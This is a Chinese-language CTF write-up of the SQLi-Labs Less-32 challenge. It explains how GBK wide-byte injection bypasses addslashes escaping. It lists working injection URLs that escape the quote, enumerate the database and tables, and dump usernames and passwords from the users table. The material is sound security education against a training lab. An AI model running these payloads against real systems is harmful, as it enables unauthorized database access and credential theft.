【SQLi-Labs】Less-32 宽字节注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.27 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 宽字节注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-32 (GET - Bypass addslashes)
  • 提示：页面回显了输入字符串的转义结果及十六进制编码。单引号被转义，需使用宽字节绕过。

2. 核心原理：GBK 宽字节注入

本关卡的核心考点是绕过 addslashes() 等转义函数的防御。后台代码通常为 id='$id'，并且执行了 SET NAMES gbk 将数据库连接字符集设置为 GBK。

  • 常规防御（转义）：当输入单引号 '（十六进制 0x27）时，后端函数会在其前面加上反斜杠 \（十六进制 0x5C）进行转义，变为 0x5C 0x27。这使得单引号失去闭合能力。
  • 宽字节绕过：GBK 是一种双字节编码，第一个字节（高位）范围是 0x81-0xFE，第二个字节（低位）范围是 0x40-0xFE。当我们输入 %df'（十六进制 0xDF 0x27）时，后端转义变为 0xDF 0x5C 0x27。 此时，0xDF 和 0x5C 被 GBK 解析器组合成了一个合法的汉字（如“運”），反斜杠 0x5C 被“吃掉”，导致后面的单引号 0x27 成功逃逸，闭合了 SQL 语句。

3. 操作步骤与解析

第一步：验证字节层面的转义

输入 URL：?id=1%df'

回显现象：页面底部提示 The Query String you input in Hex becomes : 31 df 5c 27。

解释与原理：31 对应字符 `1`，df 是输入的高位字节，5c 是转义加入的反斜杠，27 是单引号。这说明转义确实发生，且 df 与 5c 紧挨着，满足了宽字节解析的条件。

第二步：联合查询爆库名

输入 URL：?id=-1%df' union select 1,2,database()-- -

回显现象：页面第 2 列回显 security。

解释与原理：%df' 成功闭合前面的单引号。使用 -1 作为占位符使前置查询为空，通过 UNION SELECT 输出当前数据库名。

第三步：联合查询爆表名

输入 URL：?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- -

回显现象：页面回显 emails,referrers,uagents,users。

第四步：联合查询脱库

输入 URL：?id=-1%df' union select 1,2,group_concat(username,0x3a,password) from users-- -

回显现象：页面回显所有账号密码的拼接字符串，包含 Dumb:Dumb、admin:p@ssw0rd 等。

4. 踩坑记录与复盘

  • URL 编码陷阱：在浏览器地址栏或 Burp 的 Raw 面板中，必须直接发送原始字节 %df。如果使用某些工具（如 curl 的 --data-urlencode），会导致 % 被二次编码为 %25，发送的就不再是原始字节，宽字节注入失效。
  • 闭合符与注释符：宽字节注入的闭合符依然是单引号，接在 %df 后面即可。注释符使用 -- - 或 #，注意 URL 编码格式（--%20- 或 %23）。

5. 知识点总结

  • 宽字节注入 (Wide Byte Injection)：利用数据库连接字符集（如 GBK）的双字节解析特性，通过输入特定的高位字节“吃掉”转义符，使单引号逃逸。
  • 十六进制与字节流：理解了 SQL 注入在底层本质上是字节流的拼接与解析，而非表层字符串的简单替换。
